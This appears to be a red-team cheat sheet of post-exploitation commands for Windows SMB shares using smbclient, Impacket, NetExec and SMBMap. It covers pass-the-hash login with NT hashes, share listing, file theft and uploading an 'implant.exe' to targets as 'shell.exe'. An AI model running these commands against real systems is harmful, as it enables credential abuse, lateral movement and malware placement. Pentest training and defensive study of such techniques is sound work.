---
author(s):
  - Userware
tags:
  - post-exploitation
  - lateral-movement
  - windows
---
# Unix Shell

## 01 - Authenticate

### 1.1 - Samba Suite Utils

```
$ smbclient -U "[<domain>/]<username>%<password>" //<IP>/c$
```

Pass the Hash

```
$ smbclient -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> //<IP>/c$
```

### 1.2 - Impacket

```
$ smbclient.py [<domain>/]<username>:<password>@<IP>
```

Pass the Hash

```
$ smbclient.py -hashes :<nt_hash> [<domain>/]<username>@<IP>
```

### 1.3 - NetExec

#### 1.3.1 - Authentication

```
$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth]
```

Pass the Hash

```
$ netexec smb <IP> -u "<username>" -H "<nt_hash>" [-d <domain> | --local-auth]
```

## 02 - List Files and Directories

### 2.1 - Samba Suite Utils

```
smb: \> ls
```

### 2.2 - Impacket

```
# use c$

# ls
```

### 2.3 - NetExec

```
$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] --shares
```

## 03 - Copy Files

### 3.1 - Samba Suite Utils

Upload file

```
smb: \> put /local/path/to/implant.exe
```

Download file

```
smb: \> get \remote\path\to\file.txt
```

### 3.2 - Impacket

Upload file

```
# put /local/path/to/implant.exe
```

Download file

```
# get \remote\path\to\file.txt
```

### 3.3 - SMBMap

Upload file

```
$ smbmap -u "<username>" -p "< <password> | <nt_hash> >" [-d <domain>] -H <IP> --upload '/local/path/to/implant.exe' 'C$\remote\path\to\implant.exe'
```

Download file

```
$ smbmap -u "<username>" -p "< <password> | <nt_hash> >" [-d <domain>] -H <IP> --download 'C$\remote\path\to\file.txt'
```

### 3.4 - NetExec

Upload file

```
$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] --put-file /local/path/to/implant.exe \\path\\to\\remote\\shell.exe

$ netexec smb <IP> -u "<username>" -H "<nt_hash>" [-d <domain> | --local-auth] --put-file /local/path/to/implant.exe \\path\\to\\remote\\shell.exe
```

Download file

```
$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] --get-file \\remote\path\\to\\file.txt /local/path/to/file.txt

$ netexec smb <IP> -u "<username>" -H "<nt_hash>" [-d <domain> | --local-auth] --get-file \\remote\path\\to\\file.txt /local/path/to/file.txt
```

---
## References

- [NetExec Wiki: Get and Put Files](https://www.netexec.wiki/smb-protocol/get-and-put-files)